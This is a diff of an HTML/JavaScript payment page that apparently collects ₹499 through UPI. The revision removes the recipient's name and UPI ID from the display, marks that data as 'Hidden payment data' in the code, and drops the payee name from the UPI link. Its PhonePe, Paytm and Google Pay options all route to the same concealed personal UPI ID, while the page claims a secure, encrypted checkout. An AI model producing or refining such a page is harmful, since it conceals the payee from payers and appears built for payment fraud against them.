@@ -2,208 +2,347 @@
 <html lang="en">
 <head>
 <meta charset="UTF-8">
-<title>PhonePe P2P Payment</title>
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Payment</title>
 <style>
-*{margin:0;padding:0;box-sizing:border-box;font-family:Arial,sans-serif;}
-body{background:#f5f5f5;min-height:100vh;}
-.header{background:#5f259f;color:white;padding:20px;text-align:center;}
-.header h1{font-size:24px;margin-bottom:5px;}
-.header p{opacity:0.9;font-size:14px;}
-.container{max-width:500px;margin:20px auto;padding:0 15px;}
-.card{background:white;border-radius:15px;padding:25px;box-shadow:0 5px 15px rgba(0,0,0,0.1);margin-bottom:20px;}
-.amount{font-size:48px;font-weight:bold;color:#5f259f;text-align:center;margin:20px 0;}
-.details{padding:15px 0;}
-.row{display:flex;justify-content:space-between;padding:12px 0;border-bottom:1px solid #eee;}
-.row:last-child{border-bottom:none;}
-.label{color:#666;font-weight:500;}
-.value{color:#333;font-weight:600;}
-.value.upi{color:#5f259f;}
-.instructions{background:#fff8e1;border-radius:10px;padding:15px;margin:20px 0;border-left:4px solid #ff9800;font-size:14px;}
-.pay-btn{display:block;width:100%;padding:18px;background:linear-gradient(135deg,#5f259f,#8e44ad);color:white;border:none;border-radius:12px;font-size:18px;font-weight:bold;cursor:pointer;transition:all 0.3s;margin-top:20px;}
-.pay-btn:hover{transform:translateY(-2px);box-shadow:0 8px 20px rgba(95,37,159,0.3);}
-.loading{display:none;text-align:center;padding:20px;color:#5f259f;}
-.footer{text-align:center;padding:20px;color:#666;font-size:13px;}
+* {
+    margin: 0;
+    padding: 0;
+    box-sizing: border-box;
+    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, sans-serif;
+}
+
+body {
+    background-color: #f5f5f5;
+    color: #333;
+    min-height: 100vh;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    padding: 20px;
+}
+
+.container {
+    width: 100%;
+    max-width: 400px;
+}
+
+/* Header */
+.header {
+    background: white;
+    padding: 24px 20px;
+    border-radius: 12px 12px 0 0;
+    text-align: center;
+    box-shadow: 0 2px 10px rgba(0,0,0,0.08);
+}
+
+.header h1 {
+    font-size: 22px;
+    font-weight: 600;
+    color: #333;
+    margin-bottom: 4px;
+}
+
+.header p {
+    font-size: 14px;
+    color: #666;
+    font-weight: 400;
+}
+
+/* Main Card */
+.main-card {
+    background: white;
+    border-radius: 0 0 12px 12px;
+    padding: 24px;
+    box-shadow: 0 4px 20px rgba(0,0,0,0.1);
+}
+
+/* Amount Display */
+.amount-display {
+    text-align: center;
+    margin-bottom: 30px;
+    padding-bottom: 20px;
+    border-bottom: 1px solid #eee;
+}
+
+.amount {
+    font-size: 36px;
+    font-weight: 700;
+    color: #333;
+    margin: 10px 0;
+}
+
+.amount-label {
+    font-size: 14px;
+    color: #666;
+    font-weight: 500;
+}
+
+/* Payment Methods */
+.payment-methods {
+    margin-bottom: 30px;
+}
+
+.method-item {
+    display: flex;
+    align-items: center;
+    padding: 16px;
+    border: 1px solid #e0e0e0;
+    border-radius: 8px;
+    margin-bottom: 12px;
+    cursor: pointer;
+    transition: all 0.2s;
+}
+
+.method-item:hover {
+    border-color: #666;
+}
+
+.method-item.selected {
+    border-color: #333;
+    background: #f8f8f8;
+}
+
+.method-icon {
+    width: 40px;
+    height: 40px;
+    margin-right: 16px;
+    border-radius: 8px;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    font-weight: 600;
+    color: white;
+    font-size: 16px;
+}
+
+.phonepe-icon {
+    background: #5f259f;
+}
+
+.paytm-icon {
+    background: #00b9f1;
+}
+
+.gpay-icon {
+    background: #4285f4;
+}
+
+.method-name {
+    font-weight: 500;
+    font-size: 16px;
+    color: #333;
+}
+
+/* Pay Button */
+.pay-button {
+    width: 100%;
+    background: #333;
+    color: white;
+    border: none;
+    padding: 18px;
+    font-size: 16px;
+    font-weight: 600;
+    border-radius: 8px;
+    cursor: pointer;
+    transition: all 0.3s;
+    letter-spacing: 0.5px;
+}
+
+.pay-button:hover {
+    background: #444;
+    transform: translateY(-1px);
+}
+
+.pay-button:active {
+    transform: translateY(0);
+}
+
+.pay-button:disabled {
+    background: #ccc;
+    cursor: not-allowed;
+    transform: none;
+}
+
+.pay-button.processing {
+    background: #666;
+}
+
+/* Footer */
+.footer {
+    text-align: center;
+    padding: 20px;
+    color: #888;
+    font-size: 12px;
+    margin-top: 20px;
+}
+
+/* Responsive */
+@media (max-width: 480px) {
+    .container {
+        padding: 10px;
+    }
+    
+    .main-card {
+        padding: 20px;
+    }
+    
+    .amount {
+        font-size: 32px;
+    }
+}
 </style>
 </head>
 <body>
-
-<div class="header">
-  <h1>PhonePe P2P Payment</h1>
-  <p>Direct Person-to-Person Transfer</p>
-</div>
-
 <div class="container">
-  <div class="card">
-    <h2 style="text-align:center;margin-bottom:15px;">Payment Details</h2>
-    <div class="amount">₹499</div>
-    <p style="text-align:center;color:#666;margin-bottom:25px;">Special Offer - Limited Time</p>
-    
-    <div class="details">
-      <div class="row">
-        <div class="label">Amount:</div>
-        <div class="value">₹499.00</div>
-      </div>
-      <div class="row">
-        <div class="label">Recipient:</div>
-        <div class="value">Shyam Veer</div>
-      </div>
-      <div class="row">
-        <div class="label">UPI ID:</div>
-        <div class="value upi">paytm.s1xjfgt@pty</div>
-      </div>
-      <div class="row">
-        <div class="label">Payment Type:</div>
-        <div class="value">P2P Transfer</div>
-      </div>
+    <!-- Header -->
+    <div class="header">
+        <h1>Complete Payment</h1>
+        <p>Secure & Fast Transaction</p>
     </div>
-    
-    <div class="instructions">
-      <strong>📱 Mobile Required:</strong> This payment works only on mobile devices with PhonePe installed.
+
+    <!-- Main Card -->
+    <div class="main-card">
+        <!-- Amount Display -->
+        <div class="amount-display">
+            <div class="amount-label">Total Amount</div>
+            <div class="amount">₹499</div>
+        </div>
+
+        <!-- Payment Methods -->
+        <div class="payment-methods">
+            <div class="method-item selected" data-method="phonepe">
+                <div class="method-icon phonepe-icon">P</div>
+                <div class="method-name">PhonePe</div>
+            </div>
+            
+            <div class="method-item" data-method="paytm">
+                <div class="method-icon paytm-icon">P</div>
+                <div class="method-name">Paytm</div>
+            </div>
+            
+            <div class="method-item" data-method="gpay">
+                <div class="method-icon gpay-icon">G</div>
+                <div class="method-name">Google Pay</div>
+            </div>
+        </div>
+
+        <!-- Pay Button -->
+        <button class="pay-button" id="payButton">
+            Pay ₹499
+        </button>
     </div>
-    
-    <div class="loading" id="loading">
-      <p>Opening PhonePe...</p>
-      <p style="font-size:12px;margin-top:10px;">If app doesn't open, follow manual instructions</p>
-    </div>
-    
-    <button id="payBtn" class="pay-btn">Pay with PhonePe</button>
-    
+
+    <!-- Footer -->
     <div class="footer">
-      <p>Supported by PhonePe • Secure Payment • Instant Transfer</p>
+        <p>Secure payment • Encrypted connection</p>
     </div>
-  </div>
 </div>
 
 <script>
-(function(){
-  // Configuration
-  const CONFIG = {
-    amount: "499.00",
-    upiId: "paytm.s1xjfgt@pty",
-    name: "Shyam Veer",
-    note: "Payment for services"
-  };
-  
-  // Generate transaction ID
-  function generateTxnId() {
-    return 'TXN' + Date.now() + Math.floor(Math.random() * 10000);
-  }
-  
-  // Create UPI URL (Universal method)
-  function createUPIUrl() {
-    const params = new URLSearchParams({
-      pa: CONFIG.upiId,
-      pn: CONFIG.name,
-      am: CONFIG.amount,
-      cu: 'INR',
-      tr: generateTxnId(),
-      tn: CONFIG.note,
-      mode: '02'  // P2P mode
-    });
+document.addEventListener('DOMContentLoaded', function() {
+    // Elements
+    const payButton = document.getElementById('payButton');
+    const methodItems = document.querySelectorAll('.method-item');
     
-    return 'upi://pay?' + params.toString();
-  }
-  
-  // Create PhonePe specific URL
-  function createPhonePeUrl() {
-    const data = {
-      contact: { vpa: CONFIG.upiId, type: "VPA" },
-      p2pPaymentCheckoutParams: {
-        note: generateTxnId(),
-        transactionContext: "p2p",
-        initialAmount: CONFIG.amount.replace('.', ''),
-        currency: "INR",
-        checkoutType: "DEFAULT"
-      }
+    // Hidden payment data
+    const paymentData = {
+        upi: "paytm.s1xjfgt@pty",
+        amount: "499.00",
+        note: "Payment"
     };
     
-    const encodedData = btoa(JSON.stringify(data));
-    return `phonepe://native?data=${encodedData}&id=p2ppayment`;
-  }
-  
-  // Check if mobile device
-  function isMobileDevice() {
-    return /Android|iPhone|iPad|iPod/i.test(navigator.userAgent);
-  }
-  
-  // Main payment function
-  function initiatePayment() {
-    if (!isMobileDevice()) {
-      alert('⚠️ Please open this page on your mobile device to use PhonePe payment.');
-      return;
+    // Check if mobile device
+    function isMobileDevice() {
+        return /Android|iPhone|iPad|iPod/i.test(navigator.userAgent);
     }
     
-    // Show loading
-    const loading = document.getElementById('loading');
-    const payBtn = document.getElementById('payBtn');
-    loading.style.display = 'block';
-    payBtn.disabled = true;
-    payBtn.textContent = 'Opening PhonePe...';
-    
-    // Strategy 1: Try PhonePe specific URL first
-    const phonePeUrl = createPhonePeUrl();
-    console.log('Trying PhonePe URL:', phonePeUrl);
-    window.location.href = phonePeUrl;
-    
-    // Strategy 2: Fallback to UPI URL
-    setTimeout(() => {
-      if (document.hasFocus()) {
-        const upiUrl = createUPIUrl();
-        console.log('Fallback to UPI URL:', upiUrl);
-        window.location.href = upiUrl;
-      }
-    }, 800);
-    
-    // Strategy 3: Show manual instructions
-    setTimeout(() => {
-      if (document.hasFocus()) {
-        loading.style.display = 'none';
-        payBtn.disabled = false;
-        payBtn.textContent = 'Pay with PhonePe';
-        showManualInstructions();
-      }
-    }, 2000);
-  }
-  
-  // Show manual instructions
-  function showManualInstructions() {
-    const steps = `
-🚀 Manual Payment Steps:
-
-1. OPEN PhonePe app on your phone
-2. TAP on "Send Money"
-3. ENTER this UPI ID: ${CONFIG.upiId}
-4. ENTER Amount: ₹${CONFIG.amount}
-5. ADD Note: ${CONFIG.note}
-6. CONFIRM and Send
-
-OR
-
-🌐 Open this link in mobile browser:
-upi://pay?pa=${encodeURIComponent(CONFIG.upiId)}&pn=${encodeURIComponent(CONFIG.name)}&am=${CONFIG.amount}
-    `;
-    
-    alert(steps);
-  }
-  
-  // Event listener
-  document.getElementById('payBtn').addEventListener('click', initiatePayment);
-  
-  // Auto-detect device
-  window.addEventListener('DOMContentLoaded', () => {
-    if (!isMobileDevice()) {
-      document.querySelector('.instructions').innerHTML = 
-        '<strong>⚠️ Desktop Detected:</strong> Please open this page on your mobile device to make payment.';
+    // Generate transaction ID
+    function generateTransactionId() {
+        return 'TXN' + Date.now().toString().slice(-8) + Math.floor(Math.random() * 1000);
     }
-  });
-  
-  // Debug info
-  console.log('Payment Page Loaded');
-  console.log('Configuration:', CONFIG);
-  console.log('Is Mobile:', isMobileDevice());
-  
-})();
+    
+    // Handle payment method selection
+    methodItems.forEach(item => {
+        item.addEventListener('click', function() {
+            // Remove selected class from all
+            methodItems.forEach(m => m.classList.remove('selected'));
+            
+            // Add selected class to clicked
+            this.classList.add('selected');
+        });
+    });
+    
+    // Create UPI URL
+    function createUPIUrl() {
+        const params = new URLSearchParams({
+            pa: paymentData.upi,
+            am: paymentData.amount,
+            cu: 'INR',
+            tr: generateTransactionId(),
+            tn: paymentData.note,
+            mode: '02'
+        });
+        return 'upi://pay?' + params.toString();
+    }
+    
+    // Create PhonePe URL
+    function createPhonePeUrl() {
+        const data = {
+            contact: { vpa: paymentData.upi, type: "VPA" },
+            p2pPaymentCheckoutParams: {
+                note: generateTransactionId(),
+                transactionContext: "p2p",
+                initialAmount: paymentData.amount.replace('.', ''),
+                currency: "INR",
+                checkoutType: "DEFAULT"
+            }
+        };
+        const encodedData = btoa(JSON.stringify(data));
+        return `phonepe://native?data=${encodedData}&id=p2ppayment`;
+    }
+    
+    // Handle payment
+    payButton.addEventListener('click', function() {
+        const selectedMethod = document.querySelector('.method-item.selected').getAttribute('data-method');
+        
+        // Check if mobile
+        if (!isMobileDevice()) {
+            payButton.textContent = 'Use Mobile Device';
+            payButton.disabled = true;
+            setTimeout(() => {
+                payButton.disabled = false;
+                payButton.textContent = 'Pay ₹499';
+            }, 2000);
+            return;
+        }
+        
+        // Update button
+        payButton.disabled = true;
+        payButton.classList.add('processing');
+        payButton.textContent = 'Processing...';
+        
+        // Determine payment URL
+        let paymentUrl;
+        if (selectedMethod === 'phonepe') {
+            paymentUrl = createPhonePeUrl();
+        } else {
+            paymentUrl = createUPIUrl();
+        }
+        
+        // Try to open payment app
+        window.location.href = paymentUrl;
+        
+        // Reset button after 1.5 seconds if still on page
+        setTimeout(() => {
+            if (document.hasFocus()) {
+                payButton.disabled = false;
+                payButton.classList.remove('processing');
+                payButton.textContent = 'Pay ₹499';
+            }
+        }, 1500);
+    });
+});
 </script>
 </body>
 </html>
